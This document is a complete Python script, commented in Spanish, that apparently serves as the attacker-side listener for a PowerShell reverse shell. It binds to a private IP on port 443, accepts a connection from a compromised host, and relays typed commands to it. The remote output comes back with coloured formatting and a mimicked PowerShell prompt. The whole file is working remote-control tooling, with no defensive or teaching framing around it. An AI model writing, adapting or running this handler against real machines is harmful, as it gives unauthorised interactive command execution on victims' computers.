#!/usr/bin/env python3
import socket
import struct
import threading
import re

IP   = "192.168.100.138"
PORT = 443

# ==================== COLORES ====================
# =================================================

# colores ANSI
RESET    = "\033[0m"
CYAN     = "\033[96m"    # prompt PS
GREEN    = "\033[92m"    # conexión / mensajes de estado
YELLOW   = "\033[93m"    # output general
MAGENTA  = "\033[95m"    # directorios / paths en output
RED      = "\033[91m"    # errores / desconexión

# patrones para colorear el output
DIR_LINE  = re.compile(r"^(d[-a-z]+)\s+")   # líneas de directorio (Mode)
FILE_LINE = re.compile(r"^(-[-a-z]+)\s+")   # líneas de archivo

def colorize_output(line: str) -> str:
    """Colorea cada línea del output según su contenido."""
    if DIR_LINE.match(line):
        return f"{MAGENTA}{line}{RESET}"
    if FILE_LINE.match(line):
        return f"{YELLOW}{line}{RESET}"
    if re.match(r"^(Mode|----)", line):
        return f"{CYAN}{line}{RESET}"
    return f"{YELLOW}{line}{RESET}"

# =================== FIN COLORES =================
# =================================================

class Listener:
    def __init__(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((IP, PORT))
        self.server_socket.listen()
        print(f"\n{GREEN}[*] Listening for incoming connections...{RESET}")
        self.client_socket, self.client_address = self.server_socket.accept()
        print(f"{GREEN}[+] Connection established by {self.client_address}{RESET}\n")

        self._output_done = threading.Event()
        self._output_done.set()
        self.current_path = ""

    def _recv_exact(self, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = self.client_socket.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Client disconnected")
            buf += chunk
        return buf

    def _receiver(self):
        while True:
            try:
                raw_len = self._recv_exact(4)
                msg_len = struct.unpack(">I", raw_len)[0]
                data    = self._recv_exact(msg_len)

                if data == b"<CMD_DONE>":
                    self._output_done.set()
                    continue

                lines          = data.split(b"\n")
                lines_filtered = []

                for l in lines:
                    l = l.rstrip(b"\r")

                    if b"<CMD_DONE>" in l:
                        continue

                    if l.startswith(b"PS "):
                        continue

                    path_match = re.search(rb"^PATH:(.+)$", l)
                    if path_match:
                        self.current_path = path_match.group(1).decode("cp850", errors="replace").strip()
                        continue

                    lines_filtered.append(l)

                data = b"\n".join(lines_filtered)

                if not data.strip():
                    continue

                self._output_done.clear()

                decoded = data.decode("cp850", errors="replace").replace("┬", "")
                colored = "\n".join(colorize_output(l) for l in decoded.splitlines())
                print(colored, end="\n", flush=True)

            except (ConnectionError, OSError):
                self._output_done.set()
                print(f"\n{RED}[!] Cliente desconectado{RESET}")
                break

    def send_command(self, cmd: str):
        payload = (cmd + "\n").encode("utf-8")
        header  = struct.pack(">I", len(payload))
        self.client_socket.sendall(header + payload)

    def run(self):
        t = threading.Thread(target=self._receiver, daemon=True)
        t.start()

        while True:
            try:
                self._output_done.wait()
                path  = self.current_path if self.current_path else ""
                prompt = f"{CYAN}PS {MAGENTA}{path}{CYAN}>{RESET} "
                cmd = input(prompt).strip()
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit"):
                    self.send_command(cmd)
                    break
                self._output_done.clear()
                self.send_command(cmd)
            except KeyboardInterrupt:
                break


if __name__ == "__main__":
    my_listener = Listener()
    my_listener.run()
